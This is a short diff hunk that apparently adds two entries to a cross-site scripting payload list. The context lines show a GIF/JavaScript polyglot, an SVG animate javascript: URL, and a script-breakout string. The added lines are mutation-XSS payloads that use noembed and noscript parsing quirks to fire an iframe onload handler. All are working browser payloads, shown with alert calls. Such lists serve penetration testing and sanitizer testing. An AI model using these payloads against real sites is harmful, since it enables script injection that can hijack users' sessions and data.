@@ -1698,3 +1698,5 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <svg><animate href=#x attributeName=href values="&#x3000;javascript:alert(7)"/><a id=x><circle r=100>
 <% style=behavior:url(: onreadystatechange=alert(1)>
 </script><svg>"-alert(3)//
+<noembed><img src="</noembed><iframe onload=alert(1)>" /></noembed>
+<noscript><img src="</noscript><iframe onload=alert(1)>" /></noscript>
